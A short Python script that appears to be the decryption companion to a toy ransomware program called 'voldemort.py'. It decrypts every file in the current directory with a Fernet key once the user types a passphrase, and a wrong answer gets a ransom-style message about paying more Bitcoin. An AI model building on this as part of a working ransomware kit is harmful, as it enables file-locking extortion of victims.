#!/usr/bin/env python3

# Import os and Fernet!

import os
from cryptography.fernet import Fernet

# Let's find some files!
# ensure you don't touch the importent stuff! 

files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file): 
		files.append(file)
	
print(files)

# set function for the Key!

with open("thekey.key", "rb") as key:
	secretkey = key.read()

# Have ait more fun - Set a password!
#  Decrypt the files! 
# Be a nice and leave another loveletter!

secretphrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files!")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congrats, you 're files have been decrypted. Enjoy your coffee and have a nice day :)")
else:
	print("Nope,wrong secretphrase - for more Bitcoin you'll recive a hint. Think about it! Better luck next time. Have a nice day!:)")
